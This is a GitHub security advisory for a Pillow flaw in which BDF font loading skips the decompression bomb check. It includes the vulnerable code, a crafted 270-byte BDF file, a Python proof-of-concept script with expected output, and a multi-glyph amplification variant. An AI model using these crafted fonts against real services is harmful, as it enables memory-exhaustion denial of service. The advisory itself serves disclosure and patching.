# [H] Pillow `BdfFontFile`: `Image.new()` called without `_decompression_bomb_check()` — bomb protection bypass via font loading

## Summary
Severity: High
Advisory: GHSA-45hq-cxwh-f6vc
CVE: CVE-2026-55379
CWE: CWE-789
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-45hq-cxwh-f6vc
Type: github-advisory

## Affected
- PyPI: `pillow` — affected >=0 <12.3.0

## Details
### Summary
`PIL/BdfFontFile.py` `bdf_char()` (lines 84–88) reads the `BBX width height` field from a BDF font file and passes the dimensions directly to `Image.new()` without calling `Image._decompression_bomb_check()`. This completely bypasses Pillow's documented decompression bomb protection.

`Image.open()` enforces `MAX_IMAGE_PIXELS = 89,478,485` and raises `DecompressionBombError` for images exceeding `2 × MAX = 178,956,970` pixels. The BDF font loading path calls `Image.new()` directly, which only calls `_check_size()` (validates `>= 0`) — no pixel count limit.

**Vulnerable code (`PIL/BdfFontFile.py` lines 84–88):**
```python
# width, height from attacker-controlled "BBX width height x y" line
try:
    im = Image.frombytes("1", (width, height), bitmap, "hex", "1")
except ValueError:
    # TRIGGERED when BITMAP section is empty (zero hex lines)
    im = Image.new("1", (width, height))   # ← NO _decompression_bomb_check()!
    # ^ This image is stored in self.glyph[ch] — persists in memory
```

**Attack trigger:** A BDF glyph with `BBX 20000 20000` and an empty `BITMAP` section causes `Image.frombytes()` to raise `ValueError`, then `Image.new("1", (20000, 20000))` allocates **50 MB** of C-heap silently. Image.open() would raise `DecompressionBombError` for the same dimensions.

## Steps to reproduce

**Minimal malicious BDF file (270 bytes):**
```
STARTFONT 2.1
SIZE 16 75 75
FONTBOUNDINGBOX 16 16 0 -4
STARTPROPERTIES 1
COMMENT placeholder
ENDPROPERTIES
CHARS 1
STARTCHAR A
ENCODING 65
SWIDTH 500 0
DWIDTH 8 0
BBX 20000 20000 0 0
BITMAP
ENDCHAR
ENDFONT
```

**Proof of Concept script:**
```python
#!/usr/bin/env python3
"""PoC: BdfFontFile bomb bypass — 270-byte BDF → 50 MB allocation"""
import io, warnings
warnings.filterwarnings("ignore")

from PIL.BdfFontFile import BdfFontFile
from PIL.Image import _decompression_bomb_check, DecompressionBombWarning, DecompressionBombError

W, H = 20000, 20000   # 400M pixels → above DecompressionBombError threshold

# Show what Image.open() would do
warnings.filterwarnings("error", category=DecompressionBombWarning)
try:
    _decompression_bomb_check((W, H))
except (DecompressionBombWarning, DecompressionBombError) as e:
    print(f"[Image.open() path] BLOCKED by {type(e).__name__}")
warnings.filterwarnings("ignore")

# Malicious BDF: large BBX + empty BITMAP → ValueError → Image.new() without bomb check
bdf = f"""STARTFONT 2.1
SIZE 16 75 75
FONTBOUNDINGBOX 16 16 0 -4
STARTPROPERTIES 1
COMMENT x
ENDPROPERTIES
CHARS 1
STARTCHAR A
ENCODING 65
SWIDTH 500 0
DWIDTH 8 0
BBX {W} {H} 0 0
BITMAP
ENDCHAR
ENDFONT
""".encode()

print(f"[*] BDF file size  : {len(bdf)} bytes")
print(f"[*] Glyph size     : {W} x {H} = {W*H:,} pixels")
print(f"[*] C-heap target  : {W*H//8//1024**2} MB  (mode '1' = 1 bit/pixel)")

BdfFontFile(io.BytesIO(bdf))   # No exception — bomb check bypassed!

print(f"[!] CONFIRMED: BdfFontFile loaded silently — {W*H//8//1024**2} MB allocated")
print(f"    Image.open() path would have raised DecompressionBombError")
```

**Expected output:**
```
[Image.open() path] BLOCKED by DecompressionBombError
[*] BDF file size  : 270 bytes
[*] Glyph size     : 20000 x 20000 = 400,000,000 pixels
[*] C-heap target  : 47 MB  (mode '1' = 1 bit/pixel)
[!] CONFIRMED: BdfFontFile loaded silently — 47 MB allocated
    Image.open() path would have raised DecompressionBombError
```

**Amplified attack (multiple glyphs):**  
A BDF file defining 256 glyphs each at `BBX 8000 8000` causes `256 × 7.6 MB = ~1.95 GB` total C-heap allocation — all silently, bypassing documented bomb protection.

### Impact
- **Availability**: HIGH — attacker-controlled memory allocation per glyph × up to 65,536 glyphs
- **Confidentiality**: None  
- **Integrity**: None
- Any service loading BDF fonts from untrusted sources (e.g., `ImageFont.load("user.bdf")`, `BdfFontFile(fp)`) is affected
- Loaded glyph images persist in `self.glyph[ch]` for the lifetime of the font object — memory is NOT freed until the font is garbage collected

## References
- https://github.com/python-pillow/Pillow/security/advisories/GHSA-45hq-cxwh-f6vc
- https://nvd.nist.gov/vuln/detail/CVE-2026-55379
- https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d
- https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2255.yaml
- https://github.com/python-pillow/Pillow
- https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst
